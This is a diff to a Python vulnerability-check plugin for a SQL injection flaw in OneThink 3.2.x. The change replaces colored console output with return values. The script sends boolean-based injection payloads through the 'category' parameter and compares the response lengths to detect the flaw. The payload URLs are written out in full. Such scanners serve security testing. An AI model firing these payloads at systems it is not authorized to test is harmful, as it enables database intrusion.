@@ -9,8 +9,8 @@ description: onethink是ThinkPHP的子版本的一种，漏洞位于Application/
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class onethink_category_sqli_BaseVerify:
     def __init__(self, url):
@@ -26,10 +26,10 @@ class onethink_category_sqli_BaseVerify:
                 reqlst.append(str(req.text))
 
             except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+                return "[-]connect timeout"
 
         if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
-            cprint("[+]存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+            return "[+]存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         reqlst = []
         payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
@@ -40,12 +40,12 @@ class onethink_category_sqli_BaseVerify:
                 reqlst.append(str(req.text))
 
             except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+                return "[-]connect timeout"
 
         if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
-            cprint("[+]存在onethink3.2.3 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+            return "[+]存在onethink3.2.3 SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = onethink_category_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
